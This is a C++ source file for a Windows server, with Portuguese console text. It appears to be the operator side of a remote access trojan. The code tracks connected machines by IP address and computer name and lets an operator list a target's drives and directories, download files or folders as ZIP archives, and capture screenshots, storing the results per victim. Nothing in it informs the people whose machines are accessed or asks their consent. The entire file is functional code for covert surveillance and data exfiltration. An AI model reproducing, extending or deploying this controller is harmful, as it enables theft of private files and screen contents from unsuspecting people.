// Server.cpp
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <mutex>
#include <algorithm>
#include <queue>
#include <memory>
#include <condition_variable>
#include <filesystem>
#include <fstream>

#pragma comment(lib, "ws2_32.lib")
using namespace std;
namespace fs = std::filesystem;

struct ClientInfo {
    SOCKET socket;
    int id;
    string ip;
    string computerName;
    string currentDirectory;
    int downloadCount;
    int screenshotCount;
    mutex mtx;
    queue<string> messages;
    condition_variable cv;

    ClientInfo() : downloadCount(1), screenshotCount(1) {}
};

vector<shared_ptr<ClientInfo>> clients;
mutex clientsMutex;
int clientId = 1;

bool sendAll(SOCKET sock, const char* data, int length) {
    int totalSent = 0;
    while (totalSent < length) {
        int sent = send(sock, data + totalSent, length - totalSent, 0);
        if (sent == SOCKET_ERROR) {
            cerr << "send failed with error: " << WSAGetLastError() << endl;
            return false;
        }
        totalSent += sent;
    }
    return true;
}

bool sendMessage(SOCKET sock, const string& message) {
    uint32_t len = htonl(static_cast<uint32_t>(message.size()));
    if (!sendAll(sock, reinterpret_cast<char*>(&len), sizeof(len))) {
        return false;
    }
    if (!sendAll(sock, message.c_str(), message.size())) {
        return false;
    }
    return true;
}

bool recvMessage(SOCKET sock, string& message) {
    uint32_t len = 0;
    int bytesReceived = recv(sock, reinterpret_cast<char*>(&len), sizeof(len), 0);
    if (bytesReceived == 0) {
        return false;
    }
    if (bytesReceived < 0) {
        cerr << "recv failed with error: " << WSAGetLastError() << endl;
        return false;
    }
    if (bytesReceived != sizeof(len)) {
        cerr << "Incomplete length received." << endl;
        return false;
    }
    len = ntohl(len);
    string buffer(len, '\0');
    int totalReceived = 0;
    while (totalReceived < len) {
        int received = recv(sock, &buffer[totalReceived], len - totalReceived, 0);
        if (received <= 0) {
            cerr << "recv failed or connection closed." << endl;
            return false;
        }
        totalReceived += received;
    }
    message = buffer;
    return true;
}

void handleClientReceive(shared_ptr<ClientInfo> client) {
    string receivedData;
    while (recvMessage(client->socket, receivedData)) {
        {
            lock_guard<mutex> lock(client->mtx);
            client->messages.push(receivedData);
        }
        client->cv.notify_one();
        //cout << "[DEBUG] Received from Client ID " << client->id << ": " << receivedData << endl; // so se tu quiser mesmo
    }

    closesocket(client->socket);
    lock_guard<mutex> lock(clientsMutex);
    auto it = find_if(clients.begin(), clients.end(),
        [&](const shared_ptr<ClientInfo>& c) { return c->id == client->id; });
    if (it != clients.end()) {
        cout << "\nUser disconnected: ID " << (*it)->id
            << ", IP " << (*it)->ip
            << ", Computer Name: " << (*it)->computerName << "\n> ";
        clients.erase(it);
    }
}

int main() {
    WSADATA wsaData;
    int wsaStartup = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (wsaStartup != 0) {
        cerr << "WSAStartup failed with error: " << wsaStartup << endl;
        return 1;
    }

    SOCKET listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (listenSocket == INVALID_SOCKET) {
        cerr << "socket failed with error: " << WSAGetLastError() << endl;
        WSACleanup();
        return 1;
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(5555);
    serverAddr.sin_addr.s_addr = INADDR_ANY;

    if (bind(listenSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        cerr << "bind failed with error: " << WSAGetLastError() << endl;
        closesocket(listenSocket);
        WSACleanup();
        return 1;
    }

    if (listen(listenSocket, SOMAXCONN) == SOCKET_ERROR) {
        cerr << "listen failed with error: " << WSAGetLastError() << endl;
        closesocket(listenSocket);
        WSACleanup();
        return 1;
    }

    cout << "Server started. Listening on port 5555...\n";

    thread([&]() {
        while (true) {
            SOCKET clientSocket = accept(listenSocket, NULL, NULL);
            if (clientSocket == INVALID_SOCKET) {
                cerr << "accept failed with error: " << WSAGetLastError() << endl;
                continue;
            }

            string clientName;
            if (!recvMessage(clientSocket, clientName)) {
                cerr << "Failed to receive computer name from client.\n";
                closesocket(clientSocket);
                continue;
            }

            sockaddr_in clientAddr;
            int addrSize = sizeof(clientAddr);
            getpeername(clientSocket, (sockaddr*)&clientAddr, &addrSize);
            char ipStr[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &clientAddr.sin_addr, ipStr, INET_ADDRSTRLEN);

            auto client = make_shared<ClientInfo>();
            client->socket = clientSocket;
            client->id = clientId++;
            client->ip = string(ipStr);
            client->computerName = clientName;
            client->currentDirectory = "C:\\";

            {
                lock_guard<mutex> lock(clientsMutex);
                clients.push_back(client);
            }

            cout << "\nUser connected: ID " << client->id
                << ", IP " << client->ip
                << ", Computer Name: " << client->computerName << "\n> ";

            thread(handleClientReceive, client).detach();
        }
        }).detach();

    string command;
    int selectedUser = -1;
    while (true) {
        cout << "> ";
        getline(cin, command);
        if (command.empty()) continue;

        if (command == "help") {
            cout << "Lista de Comandos:\n"
                << "help - Mostra a lista de comandos\n"
                << "clear - Limpa o console\n"
                << "list users - Lista os usuários conectados\n"
                << "select user {id} - Seleciona o usuário\n"
                << "current user list drives - Lista todos os discos do usuário selecionado\n"
                << "current user select directory {diretorio} - Seleciona o diretório atual do usuário\n"
                << "current user list current directory - Lista o conteúdo do diretório atual do usuário\n"
                << "current user download {path} - Baixa o arquivo ou pasta especificado do usuário\n"
                << "current user screenshot - Captura uma screenshot do usuário selecionado\n";
        }
        else if (command == "clear") {
            system("cls");
        }
        else if (command == "list users") {
            lock_guard<mutex> lock(clientsMutex);
            if (clients.empty()) {
                cout << "Nenhum usuário conectado.\n";
            }
            else {
                for (auto& c : clients) {
                    cout << "ID: " << c->id
                        << ", IP: " << c->ip
                        << ", Computer Name: " << c->computerName << "\n";
                }
            }
        }
        else if (command.find("select user") == 0) {
            try {
                int id = stoi(command.substr(11));
                lock_guard<mutex> lock(clientsMutex);
                bool found = false;
                for (auto& c : clients) {
                    if (c->id == id) {
                        selectedUser = id;
                        found = true;
                        break;
                    }
                }
                if (found) {
                    cout << "Usuário selecionado: ID " << selectedUser << "\n";
                }
                else {
                    cout << "Usuário não encontrado.\n";
                }
            }
            catch (...) {
                cout << "Formato de comando inválido. Use: select user {id}\n";
            }
        }
        else if (command == "current user list drives") {
            if (selectedUser == -1) {
                cout << "Nenhum usuário selecionado.\n";
                continue;
            }

            shared_ptr<ClientInfo> targetClient = nullptr;
            {
                lock_guard<mutex> lock(clientsMutex);
                for (auto& c : clients) {
                    if (c->id == selectedUser) {
                        targetClient = c;
                        break;
                    }
                }
            }

            if (!targetClient) {
                cout << "Usuário selecionado não está mais conectado.\n";
                selectedUser = -1;
                continue;
            }

            if (!sendMessage(targetClient->socket, "list drives")) {
                cout << "Falha ao enviar comando para o usuário.\n";
                continue;
            }

            unique_lock<mutex> clientLock(targetClient->mtx);
            if (targetClient->cv.wait_for(clientLock, chrono::seconds(5), [&]() { return !targetClient->messages.empty(); })) {
                while (!targetClient->messages.empty()) {
                    string response = targetClient->messages.front();
                    targetClient->messages.pop();
                    cout << response << "\n";
                }
            }
            else {
                cout << "Tempo esgotado aguardando resposta.\n";
            }
        }
        else if (command.find("current user select directory") == 0) {
            if (selectedUser == -1) {
                cout << "Nenhum usuário selecionado.\n";
                continue;
            }

            string prefix = "current user select directory ";
            if (command.size() <= prefix.size()) {
                cout << "Diretório inválido.\n";
                continue;
            }

            string dir = command.substr(prefix.size());
            if (dir.empty()) {
                cout << "Diretório inválido.\n";
                continue;
            }

            shared_ptr<ClientInfo> targetClient = nullptr;
            {
                lock_guard<mutex> lock(clientsMutex);
                for (auto& c : clients) {
                    if (c->id == selectedUser) {
                        targetClient = c;
                        break;
                    }
                }
            }

            if (!targetClient) {
                cout << "Usuário selecionado não está mais conectado.\n";
                selectedUser = -1;
                continue;
            }

            {
                lock_guard<mutex> lock(targetClient->mtx);
                targetClient->currentDirectory = dir;
            }
            cout << "Diretório atualizado para: " << dir << "\n";
        }
        else if (command.find("current user download ") == 0) {
            if (selectedUser == -1) {
                cout << "Nenhum usuário selecionado.\n";
                continue;
            }

            string prefix = "current user download ";
            if (command.size() <= prefix.size()) {
                cout << "Caminho inválido.\n";
                continue;
            }

            string path = command.substr(prefix.size());
            if (path.empty()) {
                cout << "Caminho inválido.\n";
                continue;
            }

            shared_ptr<ClientInfo> targetClient = nullptr;
            {
                lock_guard<mutex> lock(clientsMutex);
                for (auto& c : clients) {
                    if (c->id == selectedUser) {
                        targetClient = c;
                        break;
                    }
                }
            }

            if (!targetClient) {
                cout << "Usuário selecionado não está mais conectado.\n";
                selectedUser = -1;
                continue;
            }

            string downloadCommand = "current user download " + path;
            if (!sendMessage(targetClient->socket, downloadCommand)) {
                cout << "Falha ao enviar comando para o usuário.\n";
                continue;
            }

            unique_lock<mutex> clientLock(targetClient->mtx);
            if (targetClient->cv.wait_for(clientLock, chrono::seconds(60), [&]() { return !targetClient->messages.empty(); })) {
                string zipData = targetClient->messages.front();
                targetClient->messages.pop();

                string downloadFolder = "downloads/" + targetClient->computerName;
                fs::create_directories(downloadFolder);

                string zipFilename = "arquivo" + to_string(targetClient->downloadCount) + ".zip";
                targetClient->downloadCount++;

                string savePath = downloadFolder + "/" + zipFilename;

                ofstream outFile(savePath, ios::binary);
                if (!outFile) {
                    cout << "Falha ao criar o arquivo ZIP no servidor: " << savePath << "\n";
                }
                else {
                    outFile.write(zipData.c_str(), zipData.size());
                    outFile.close();
                    cout << "Arquivo ZIP salvo em: " << savePath << "\n";
                }
            }
            else {
                cout << "Tempo esgotado aguardando resposta do usuário.\n";
            }
        }
        else if (command.find("current user screenshot") == 0) {
            if (selectedUser == -1) {
                cout << "Nenhum usuário selecionado.\n";
                continue;
            }

            shared_ptr<ClientInfo> targetClient = nullptr;
            {
                lock_guard<mutex> lock(clientsMutex);
                for (auto& c : clients) {
                    if (c->id == selectedUser) {
                        targetClient = c;
                        break;
                    }
                }
            }

            if (!targetClient) {
                cout << "Usuário selecionado não está mais conectado.\n";
                selectedUser = -1;
                continue;
            }

            string screenshotCommand = "current user screenshot";
            if (!sendMessage(targetClient->socket, screenshotCommand)) {
                cout << "Falha ao enviar comando para o usuário.\n";
                continue;
            }

            unique_lock<mutex> clientLock(targetClient->mtx);
            if (targetClient->cv.wait_for(clientLock, chrono::seconds(10), [&]() { return !targetClient->messages.empty(); })) {
                string pngData = targetClient->messages.front();
                targetClient->messages.pop();

                string screenshotFolder = "screenshots/" + targetClient->computerName;
                fs::create_directories(screenshotFolder);

                string pngFilename = "screenshot" + to_string(targetClient->screenshotCount) + ".png";
                targetClient->screenshotCount++;

                string savePath = screenshotFolder + "/" + pngFilename;

                ofstream outFile(savePath, ios::binary);
                if (!outFile) {
                    cout << "Falha ao criar o arquivo PNG no servidor: " << savePath << "\n";
                }
                else {
                    outFile.write(pngData.c_str(), pngData.size());
                    outFile.close();
                    cout << "Screenshot salvo em: " << savePath << "\n";
                }
            }
            else {
                cout << "Tempo esgotado aguardando resposta do usuário.\n";
            }
        }
        else if (command == "current user list current directory") {
            if (selectedUser == -1) {
                cout << "Nenhum usuário selecionado.\n";
                continue;
            }

            shared_ptr<ClientInfo> targetClient = nullptr;
            {
                lock_guard<mutex> lock(clientsMutex);
                for (auto& c : clients) {
                    if (c->id == selectedUser) {
                        targetClient = c;
                        break;
                    }
                }
            }

            if (!targetClient) {
                cout << "Usuário selecionado não está mais conectado.\n";
                selectedUser = -1;
                continue;
            }

            string listCommand = "list current directory " + targetClient->currentDirectory;
            if (!sendMessage(targetClient->socket, listCommand)) {
                cout << "Falha ao enviar comando para o usuário.\n";
                continue;
            }

            unique_lock<mutex> clientLock(targetClient->mtx);
            if (targetClient->cv.wait_for(clientLock, chrono::seconds(5), [&]() { return !targetClient->messages.empty(); })) {
                while (!targetClient->messages.empty()) {
                    string data = targetClient->messages.front();
                    targetClient->messages.pop();
                    size_t pos = 0;
                    while ((pos = data.find('\n')) != string::npos) {
                        cout << data.substr(0, pos) << "\n";
                        data.erase(0, pos + 1);
                    }
                    if (!data.empty()) cout << data << "\n";
                }
            }
            else {
                cout << "Tempo esgotado aguardando resposta.\n";
            }
        }
        else {
            cout << "Comando desconhecido. Use 'help' para ver a lista de comandos.\n";
        }
    }
}